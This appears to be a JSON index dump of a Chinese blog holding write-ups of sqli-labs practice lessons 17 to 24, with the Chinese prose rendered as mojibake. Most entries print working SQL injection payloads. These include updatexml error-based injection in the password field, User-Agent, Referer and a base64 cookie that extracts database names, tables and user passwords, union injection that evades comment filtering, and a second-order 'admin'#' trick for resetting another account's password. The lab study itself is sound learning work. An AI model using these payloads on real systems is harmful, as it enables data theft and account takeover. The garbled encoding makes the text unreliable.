·ä¸€ç§æ€è·¯ï¼Œæˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œä¾‹å¦‚ï¼šè´¦æˆ·ï¼šadminâ€™#ï¼ˆadminä¸ºç›®æ ‡ç”¨æˆ·åï¼‰ï¼Œå¯†ç ï¼š123ã€‚ ç„¶åæˆ‘ä»¬è¾“å…¥æˆ‘ä»¬æ³¨å†Œçš„è¿™ä¸ªè´¦å·å¯†ç ç™»å…¥ï¼Œè¿›å…¥ä¿®æ”¹å¯†ç é¡µé¢ï¼Œ pass_changeçš„æºç ä¸­sqlè¯­å¥æ˜¯ï¼š 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; è€Œç™»å…¥æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·åï¼Œsqlè¯­å¥è¢«ç¯¡æ”¹ä¸ºï¼š 123$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;ç›¸å½“äºï¼š$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;&quot;; ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾¾åˆ°äº†æ— éœ€çŸ¥é“ç›®æ ‡è´¦æˆ·å¯†ç è€Œå¯ä»¥ä¿®æ”¹ç›®æ ‡è´¦æˆ·çš„å¯†ç ï¼Œè¿›è€Œé€šè¿‡ä¿®æ”¹çš„æ–°å¯†ç ç™»å…¥ç›®æ ‡è´¦æˆ·ã€‚ ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬è¾“å…¥çš„å•å¼•å·ä¸æ˜¯è¢«è½¬ä¹‰äº†å—ï¼Œé‚£å®ƒæ„é€ çš„sqlè¯­å¥æ€ä¹ˆè¿˜ä¼šèµ·ä½œç”¨å‘¢ï¼Ÿ åŸæ¥è½¬ä¹‰åªæ˜¯æš‚æ—¶çš„ï¼Œæ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä»¥åè¿˜æ˜¯ä»¥åŸå¥çš„å½¢å¼å­˜åœ¨ï¼Œåæ–œæ ä¸ä¼šéšä¹‹æ’å…¥æ•°æ®åº“ã€‚ æ³¨ï¼šæˆ‘å‘ç°è¿™æ ·æ³¨å…¥è¿˜æ˜¯å¾ˆæœ‰å±€é™æ€§çš„ï¼Œå› ä¸ºä½ åªèƒ½ä¸€ä¸ªä¸€ä¸ªå»ç ´è§£ï¼Œå¦‚æœé€šè¿‡æ³¨å†Œè´¦æˆ·æ—¶æ„é€ payloadï¼Œä¼šå—åˆ°å­—èŠ‚é•¿åº¦çš„é™åˆ¶ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson23","date":"2021-02-03T10:52:07.000Z","path":"2021/02/03/lesson23/","text":"lesson23ï¼šè¿™å…³åˆå˜å›äº†getè¯·æ±‚ç±»å‹ã€‚ åœ¨urlè¡Œè¾“å…¥ï¼š?id=1, å‘ç°æœ‰å›æ˜¾ã€‚ è¾“å…¥ï¼š?id=1â€™ï¼ŒæŠ¥sqlè¯­æ³•é”™è¯¯ï¼› è¾“å…¥ï¼š?id=1â€™ or â€˜1â€™=â€™1 ï¼Œç™»å…¥æˆåŠŸï¼› è¾“å…¥ï¼š?id=1â€™ and â€˜1â€™=â€™2 ï¼Œç™»å…¥å¤±è´¥ã€‚å› æ­¤ç¡®å®šä¸ºå•å¼•å·ç±»å‹æ³¨å…¥ã€‚ å› ä¸ºæœ‰å›æ˜¾ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä½¿ç”¨è”åˆæ³¨å…¥å°±å¯ä»¥äº†ï¼Œè¯¦æƒ…å‚è€ƒlesson1ï¼Œä¸å†èµ˜è¿°ã€‚ ä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹å€¼å¾—æ³¨æ„ï¼Œå°±æ˜¯æˆ‘åœ¨æ„é€ payloadè¯­å¥æ—¶ï¼Œæˆ‘å‘ç°æˆ‘è‹¥ä»¥ &#39;--+&#39; æˆ–è€… # ç»“å°¾åˆ™é¡µé¢è¿”å›sqlè¯­æ³•é”™è¯¯ï¼Œäºæ˜¯æˆ‘æŸ¥çœ‹æºç ï¼š 12345$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); ä»‹ç»ä¸€ä¸‹preg_replace()å‡½æ•°ï¼š å› æ­¤æˆ‘ä»¬å¾—çŸ¥ &#39;--+&#39; å’Œ # éƒ½è¢«å±è”½æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆé—­åˆsqlè¯­å¥å‘¢ï¼Ÿ 1.unionæ³¨å…¥æ—¶ä»¥çˆ†åº“ä¸ºä¾‹ï¼š?id=-1â€™ union select 1,database(),â€™3 â€‹ æˆ–ï¼š?id=-1â€™ union select 1,database(),3 or â€˜1â€™=â€™ 2.æŠ¥é”™æ³¨å…¥æ—¶ä»¥çˆ†åº“ä¸ºä¾‹ï¼š?id=-1â€™ and updatexml(1,concat(0x7e,(select database()),0x7e),1) or â€˜1â€™=â€™ â€‹","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson21-22","date":"2021-02-03T03:45:46.000Z","path":"2021/02/03/lesson21-22/","text":"è¿™å…³è™½ç„¶å’Œlesson18å¾ˆåƒï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šä¸œè¥¿å€¼å¾—å¼€ä¸€ç¯‡æ–°çš„blogã€‚ lesson21ï¼šé¦–å…ˆè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åï¼Œå¯†ç ï¼Œç”¨burpæŠ“åŒ…ï¼š æˆ‘ä»¬çœ‹åˆ°cookieä¸€è¡Œçš„uname=è¢«åŠ å¯†äº†ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç ï¼š 1setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600); spï¼šä»‹ç»ä¸€ä¸‹setcookieï¼ˆï¼‰å‡½æ•°ï¼š setcookie() å‡½æ•°å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª HTTP cookieã€‚ cookie æ˜¯ç”±æœåŠ¡å™¨å‘é€åˆ°æµè§ˆå™¨çš„å˜é‡ã€‚cookie é€šå¸¸æ˜¯æœåŠ¡å™¨åµŒå…¥åˆ°ç”¨æˆ·è®¡ç®—æœºä¸­çš„å°æ–‡æœ¬æ–‡ä»¶ã€‚æ¯å½“åŒä¸€å°è®¡ç®—æœºé€šè¿‡æµè§ˆå™¨è¯·æ±‚é¡µé¢æ—¶ï¼Œå°±ä¼šå‘é€è¿™ä¸ª cookieã€‚ cookie çš„åç§°è‡ªåŠ¨æŒ‡å®šä¸ºç›¸åŒåç§°çš„å˜é‡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¢«å‘é€çš„ cookie åä¸º â€œuserâ€ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªåä¸º $user çš„å˜é‡ï¼ŒåŒ…å« cookie çš„å€¼ã€‚ å¿…é¡»åœ¨ä»»ä½•å…¶ä»–è¾“å‡ºå‘é€åˆ°å®¢æˆ·ç«¯å‰å¯¹ cookie è¿›è¡Œèµ‹å€¼ã€‚ å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å› TRUEã€‚å¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°cookieçš„å€¼è¢«åŠ å¯†äº†ã€‚æ¥ç€çœ‹æºç ï¼š è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿¡è¿˜æ˜¯ä»cookieè¿›è¡Œæ³¨å…¥ï¼Œä¸è¿‡è¦å°†payloadè¿›è¡Œbase64åŠ å¯†ã€‚ åœ¨çº¿ç¼–è¯‘ç½‘ç«™ï¼šhttps://tool.oschina.net/encrypt?type=3 é‚£ä¹ˆå¼€å§‹æ³¨å…¥å§ï¼ æ³•1ï¼šæŠ¥é”™æ³¨å…¥ï¼Œç±»ä¼¼äºlesson18ï¼Œä¸è¿‡å¤šèµ˜è¿°äº†ï¼Œæ„é€ payloadç„¶ååœ¨ç½‘ç«™ä¸ŠåŠ å¯†ï¼Œå†æ·»åŠ åˆ°cookieä¸Šã€‚ æ³•2ï¼šunionè”åˆæ³¨å…¥ï¼Œå› ä¸ºå½“æˆ‘ä»¬è¾“å…¥æ­£ç¡®çš„è´¦å·å¯†ç çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¡µé¢æœ‰å›æ˜¾ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡order byå‡½æ•°æ¥æŸ¥å­—èŠ‚ã€‚å‰©ä¸‹çš„å°±æ˜¯ä»¥å‰å­¦çš„å†…å®¹äº†ï¼Œä¸å†èµ˜è¿°ã€‚ lesson22ï¼šè¿™ä¸€å…³å’Œlesson21å·®ä¸å¤šï¼Œå°±æ˜¯æ³¨å…¥ç±»å‹å˜æˆäº†åŒå¼•å·ï¼Œå…¶ä½™ä¸€è‡´ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"HTTPåè®®","date":"2021-02-02T14:56:16.000Z","path":"2021/02/02/HTTPåè®®/","text":"","tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://example.com/tags/HTTP/"}]},{"title":"lesson18-20","date":"2021-02-01T12:33:49.000Z","path":"2021/02/01/lesson18-20/","text":"lesson18ï¼šè¿™ä¸€é¢˜çœ‹è¿‡å»å’Œlesson17æ²¡ä»€ä¹ˆå·®åˆ«ï¼Œå°±å¤šäº†ä¸€è¡Œidåœ°å€ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç ï¼š 12$uname = check_input($_POST[&#x27;uname&#x27;]);$passwd = check_input($_POST[&#x27;passwd&#x27;]); å¯çŸ¥ï¼Œæ•°æ®åº“å¯¹è¾“å…¥çš„usernameå’Œpasswordéƒ½åšäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³é€šè¿‡é¡µé¢è¾“å…¥è·å–æ•°æ®åº“ä¿¡æ¯çš„æ–¹æ³•è‚¯å®šæ˜¯èµ°ä¸é€šäº†ã€‚æˆ‘ä»¬å†çœ‹æºç ï¼š 12$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; æºç ä½¿ç”¨HTTP_USER_AGENTåªè·å–äº†HTTPè¯·æ±‚å¤´çš„ä¸€ä¸ªéƒ¨åˆ†: User-Agent ã€‚è€Œè·å–IPåˆ™ä½¿ç”¨äº†RENOTE_ADDRï¼Œè¿™èƒ½ç›´æ¥è·å–TCPåè®®æ•°æ®åŒ…çš„åº•å±‚ä¼šè¯IPåœ°å€ï¼Œå®ƒèƒ½è¢«ä»£ç†æœåŠ¡å™¨æˆ–è·¯ç”±ä¿®æ”¹ä¼ªé€ ï¼Œä½†ä¿®æ”¹XFFå¤´å°±å¯ä»¥æ›´æ”¹çš„ã€‚æˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼š 1$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„uagentç­‰ä¼šè¢«å¸¦å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¥½åƒå¯ä»¥é€šè¿‡å¯¹uagentè¿›è¡Œæ”¹å†™ï¼Œæ„é€ payloadã€‚ ç„¶åæˆ‘ä»¬ç°åœ¨åœ¨é¡µé¢è¾“å…¥æ­£ç¡®è´¦å·å¯†ç åï¼Œå‘ç°é¡µé¢å›æ˜¾ï¼š é‚£ä¹ˆæˆ‘ä»¬æ›´å¯ä»¥ç¡®å®šæ˜¯å¯¹User-Agent ä¸‹æ‰‹ã€‚ é€šè¿‡ç¬¬ä¸‰æ®µæºç æˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ³¨å…¥ç±»å‹ä¸ºï¼šâ€™ ; äºæ˜¯æˆ‘ä»¬å¯ä»¥å¼€å§‹ç”¨burp suiteæŠ“åŒ…ï¼š payloadæ¨¡æ¿ï¼šâ€™ or updatexml(1,concat(â€˜#â€™,(clause),â€™#â€™),1),1,1)#å…¶ä¸­claseä¸ºæƒ³è¦æŸ¥è¯¢çš„å­å¥ï¼›æºç çš„insertè¯­å¥ä¸­åŸæœ¬æœ‰ä¸‰ä¸ªå‚æ•°ï¼ˆç”¨ä¸‰ä¸ª1è¡¨ç¤ºï¼‰â€”â€”ï¼ˆ1ï¼Œ1*ï¼Œ1**ï¼‰ï¼Œç„¶å1è¢«&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) æ›¿æ¢ï¼Œåé¢1*å’Œ1**æ˜¯ä¸ºäº†å’Œinsertè¯­å¥ä¸­å‚æ•°æ•°é‡ä¸€è‡´ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š å½“updatexmlå‡½æ•°æŠ¥é”™ä»¥åï¼Œæ•°æ®åº“å°±ä¸ä¼šå»æ£€æŸ¥1*å’Œ1**äº†ã€‚ æ³¨ï¼š&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) å¸¦å…¥åˆ°æºç ä¸­ &#39;&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1)ï¼Œç¬¬ä¸€å¤„åˆå¹¶æ˜¯ç©ºï¼Œæ‰€ä»¥uagentæŠŠupdatexmlå‡½æ•°çš„å€¼å¸¦å…¥æ•°æ®åº“ã€‚ çˆ†åº“ï¼šç½‘é¡µè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼ŒburpæŠ“åŒ…ï¼Œåœ¨User-Agentä¸€è¡Œæ„é€ payloadï¼š 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select database()),&#x27;#&#x27;),1),1,1)# Forwordï¼Œå¾—ï¼š çˆ†è¡¨ï¼šç½‘é¡µè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼ŒburpæŠ“åŒ…ï¼Œåœ¨User-Agentä¸€è¡Œæ„é€ payloadï¼š 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)# Forwordï¼Œå¾—ï¼š æ³¨ï¼šå› ä¸ºæˆ‘ä¹‹å‰åœ¨securityæ•°æ®åº“é‡Œåˆ›äº†è¡¨ï¼Œç°åœ¨å¯¼è‡´è¡¨å¤ªå¤šäº†ï¼Œè€ŒæŠ¥é”™çš„é•¿åº¦æœ‰é™ï¼Œä¸èƒ½æŸ¥åˆ°æ‰€æœ‰è¡¨ã€‚ç„¶åæˆ‘æƒ³ç”¨limitå‡½æ•°é™åˆ¶æŸ¥è¯¢æ•°é‡ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†å¥½ä¹…æ²¡æœ‰æˆåŠŸï¼Œå…ˆç•™ä¸ªå‘å§ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ çˆ†åˆ—ï¼šç½‘é¡µè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼ŒburpæŠ“åŒ…ï¼Œåœ¨User-Agentä¸€è¡Œæ„é€ payloadï¼š 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)# Forwordï¼Œå¾—ï¼š çˆ†å€¼ï¼šç½‘é¡µè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼ŒburpæŠ“åŒ…ï¼Œåœ¨User-Agentä¸€è¡Œæ„é€ payloadï¼š 12&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select * from (select concat_ws(&#x27; &#x27;,id,username,password) from users limit 0,1) x),&#x27;#&#x27;),1),1,1)# Forwordï¼Œå¾—ï¼š lesson19ï¼šè¿™ä¸€å…³å’Œlesson18å·®ä¸å¤šï¼Œåªä¸è¿‡æ”¹åœ¨Refererå¤„å†™payloadã€‚ lesson20ï¼šè¿™ä¸€å…³å’Œlesson18ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä¸è¿‡åœ¨cookieå¤„å†™payloadï¼Œè€Œä¸”å› ä¸ºå½“è¾“å…¥æ­£ç¡®è´¦å·å¯†ç çš„æ—¶å€™ï¼Œç½‘é¡µä¼šå›æ˜¾ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥é‡‡ç”¨unionè”åˆæ³¨å…¥ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson17","date":"2021-01-31T13:26:30.000Z","path":"2021/01/31/lesson17/","text":"lesson17ï¼šè¿™ä¸€å…³ä¸ç®¡æˆ‘ä»¬åœ¨usernameä¸Šæ„é€ ä»€ä¹ˆpayloadéƒ½æ— æ³•ç¯¡æ”¹æ•°æ®åº“ã€‚ æˆ‘ä»¬æŸ¥çœ‹æºç ï¼š 1234567891011121314151617181920212223242526function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; å…ˆè®¤è¯†ä¸€ä¸‹é™Œç”Ÿå‡½æ•°ï¼š1.get_magic_quotes_gpc()å‡½æ•°get_magic_quotes_gpc()å‡½æ•°å–å¾—PHPç¯å¢ƒé…ç½®çš„å˜é‡magic_quotes_gpc(GPC, Get/Post/Cookie)å€¼ã€‚è¿”å›0è¡¨ç¤ºæœ¬åŠŸèƒ½å…³é—­ï¼Œè¿”å›1è¡¨ç¤ºæœ¬åŠŸèƒ½æ‰“å¼€ã€‚ æ³¨ï¼šå¼€å¯magic_quotes_gpc=onä¹‹åï¼Œèƒ½å®ç°addsIshes()å’Œstripslashes()è¿™ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ã€‚åœ¨PHP4.0åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œè¯¥é€‰é¡¹é»˜è®¤æƒ…å†µä¸‹æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥åœ¨PHP4.0åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œå°±ç®—PHPç¨‹åºä¸­çš„å‚æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼ŒPHPç³»ç»Ÿä¹Ÿä¼šå¯¹æ¯ä¸€ä¸ªé€šè¿‡GETã€POSTã€COOKIEæ–¹å¼ä¼ é€’çš„å˜é‡è‡ªåŠ¨è½¬æ¢ï¼Œæ¢å¥è¯è¯´ï¼Œè¾“å…¥çš„æ³¨å…¥æ”»å‡»ä»£ç å°†ä¼šå…¨éƒ¨è¢«è½¬æ¢ï¼Œå°†ç»™æ”»å‡»è€…å¸¦æ¥éå¸¸å¤§çš„å›°éš¾ã€‚ 2.addslashes()å‡½æ•°addslashes()å‡½æ•°å°†è¾“å…¥æ•°æ®ä¸­çš„é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’ŒNULL(ç©ºå­—ç¬¦)ï¼‰ä¹‹å‰æ·»åŠ åæ–œæ \\çš„å­—ç¬¦ä¸²ã€‚ 3.stripslashes()å‡½æ•°stripslashes(string)å‡½æ•°åˆ é™¤ç”±addslashes()å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚ æ³¨æ„ï¼šå½“magic_quotes_gpcæ‰“å¼€æ—¶ï¼Œæ‰€æœ‰çš„å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’ŒNULL(ç©ºå­—ç¬¦)ä¼šè‡ªåŠ¨è½¬ä¸ºå«æœ‰åæ–œæ çš„æº¢å‡ºå­—ç¬¦ï¼ˆPHPå¯¹æ‰€æœ‰çš„GETã€POSTå’ŒCOOKIEæ•°æ®è‡ªåŠ¨è¿è¡Œaddslashes()ï¼‰ã€‚æ‰€ä»¥ä¸åº”å¯¹å·²è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨addslashes()ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åŒå±‚è½¬ä¹‰ã€‚é‡åˆ°è¿™ç§æƒ…å†µæ—¶å¯ä»¥ä½¿ç”¨å‡½æ•°get_magic_quotes_gpc()è¿›è¡Œæ£€æµ‹ã€‚ 4.ctype_digit()å‡½æ•°ctype_digit()å‡½æ•°æ£€æŸ¥å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦æ˜¯å¦éƒ½æ˜¯åè¿›åˆ¶æ•°å­—ï¼Œè‹¥æ˜¯åˆ™è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚ 5.mysql_real_escape_string()å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼š spï¼šæ€ä¹ˆç†è§£è¿™ä¸ªè½¬ä¹‰å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼ŒPHPæŠŠè¾“å…¥æ•°æ®ä¸­çš„å•å¼•å·è½¬ä¹‰äº†ï¼ˆå•å¼•å·å‰åŠ äº†ä¸ªåæ–œæ ï¼‰å˜æˆå­—ç¬¦ä¸²ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆè¾“å…¥æ•°æ®ä»£å…¥æ•°æ®åº“sqlè¯­å¥æ—¶ï¼Œè¿™ä¸ªè½¬ä¹‰åçš„å•å¼•å·å°±æ— æ³•ä½œä¸ºå­—ç¬¦ä¸æ•°æ®åº“sqlè¯­å¥ä¸­æœ¬æ¥å­˜åœ¨çš„å•å¼•å·åˆå¹¶ï¼Œæ‰€ä»¥æ— æ³•ç¯¡æ”¹sqlè¯­å¥ã€‚ æˆ‘ä»¬è§‚å¯Ÿæºç ï¼š 1234567$uname=check_input($_POST[&#x27;uname&#x27;]); $passwd=$_POST[&#x27;passwd&#x27;];......$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; ç”±äºæ•°æ®åº“ä¸­å¯¹è¾“å…¥çš„usernameä¸€é¡¿æ“ä½œï¼Œé‚£ä¹ˆä»usernameä¸‹æ‰‹è‚¯å®šåƒä¸äº†å…œç€èµ°ï¼Œæ‰€ä»¥è½¬å˜æ€è·¯å¯ä»¥ä»passwordä¸‹æ‰‹ã€‚ è¾“å…¥username=root ï¼›password=rootâ€™ï¼Œé¡µé¢æŠ¥sqlè¯­æ³•é”™è¯¯ï¼Œç¡®å®šæ³¨å…¥ç‚¹ä¸ºï¼šâ€™ ; ï¼è¿™é‡Œä»‹ç»ä¸€ä¸ªæ³¨å…¥æ–¹æ³•ï¼š æŠ¥é”™æ³¨å…¥ï¼šA.å¸¸ç”¨å‡½æ•°ï¼š1.updatexml()å‡½æ•°ï¼šupdatexml(xml_doc,xpath,new_value)å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯(xml_document, XPath_string, new_value)â€”- ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentï¼Œ Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼› ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)ï¼› ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼Œ Stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®ï¼› è¯¥å‡½æ•°çš„ä½œç”¨å°±æ˜¯æŠŠxmlæ–‡æ¡£ä¸­çš„æŒ‡å®šå­—ç¬¦ä¸²æ›¿æ¢æˆæ–°å€¼ã€‚ 2.extractvalue()å‡½æ•°ï¼šextractvalue(xml_doc, xpath)å‡½æ•°ä½œç”¨æ˜¯ä»æŒ‡å®šxmlæ–‡æ¡£ä¸­æŸ¥è¯¢æŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚ B.æŠ¥é”™æ³¨å…¥åŸç†ï¼š(1)å‚æ•°xpathéœ€è¦çš„æ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä¸æ˜¯å°±ä¼šæŠ¥é”™ã€‚ (2))å½“xpathè·¯å¾„è¯­æ³•é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™ã€‚ æ³¨ï¼šæŠ¥é”™çš„é•¿åº¦æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„ï¼Œä¸è¦æ„é€ è¿‡é•¿çš„payloadï¼Œå¦åˆ™åé¢çš„å­—ç¬¦ä¸²ä¼šè¢«æˆªæ–­ã€‚ æ‡‚å¾—äº†ä»¥ä¸ŠçŸ¥è¯†å°±å¯ä»¥å¼€å§‹æ³¨å…¥äº†ã€‚å› ä¸ºä¸¤ç§å‡½æ•°çš„æ³¨å…¥æ–¹æ³•å¤§ç›¸å¾„åº­ï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘å°±ä¸¾updatexmlä¸ºä¾‹è§£é¢˜ã€‚ çˆ†åº“ï¼šè¾“å…¥ï¼š 12username=rootpassword=(anything)&#x27; or updatexml(1,concat(&#x27;#&#x27;, database()),1)# å¾—ï¼š æ³¨ï¼š#å­—ç¬¦æ˜¯ä¸ºäº†ä½¿xpathè·¯å¾„è¯­æ³•é”™è¯¯ï¼Œä¹Ÿå¯ä»¥ç”¨åˆ«çš„å­—ç¬¦ä»£æ›¿ã€‚ çˆ†è¡¨ï¼šè¾“å…¥ï¼š 12username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)# å¾—ï¼š çˆ†åˆ—ï¼šè¾“å…¥ï¼š 12username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)# å¾—ï¼š çˆ†å€¼ï¼šè¾“å…¥ï¼š 123username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select * from (select concat_ws(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)# å¾—ï¼š æ³¨ï¼š1.çˆ†å€¼çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä¸èƒ½ç›´æ¥ç”¨ç®€å•çš„select concat(username)ï¼Œè¿™æ ·ä¼šå¼•èµ·æŠ¥é”™ï¼š åŸå› æ˜¯ï¼šåœ¨åŒä¸€ä¸ªè¯­å¥ä¸­ï¼Œä¸èƒ½å…ˆæŸ¥è¯¢è¡¨ä¸­çš„å€¼å†updateè¿™ä¸ªè¡¨ï¼Œå¯ä»¥å…ˆæŠŠæŸ¥è¯¢å‡ºçš„å€¼ä½œä¸ºä¸€ä¸ªæ´¾ç”Ÿè¡¨ï¼Œç„¶ååœ¨è¿™ä¸ªæ´¾ç”Ÿè¡¨é‡Œé¢å†æ¬¡è¿›è¡ŒæŸ¥è¯¢ã€‚ 2.ç”±äºç”¨æˆ·æ•°æ®è¾ƒå¤šï¼Œä¸”æŠ¥é”™å†…å®¹æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ³¨å…¥æ˜¯å¯ä»¥é€šè¿‡æ”¹å˜limitå‡½æ•°å˜é‡æ¥æ§åˆ¶ å›æ˜¾å†…å®¹ã€‚ spï¼šå›é¡¾ä¸€ä¸‹å­—ç¬¦ä¸²è¿æ¥å‡½æ•° 1.concat(str1,str2,â€¦)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²2.concat_ws(â€˜separatorâ€™,str1,str2,â€¦)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²3.group_concat(str1,str2,â€¦)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson11-16","date":"2021-01-30T14:56:26.000Z","path":"2021/01/30/lesson11-16/","text":"postæ³¨å…¥Qï¼šä»€ä¹ˆæ˜¯post 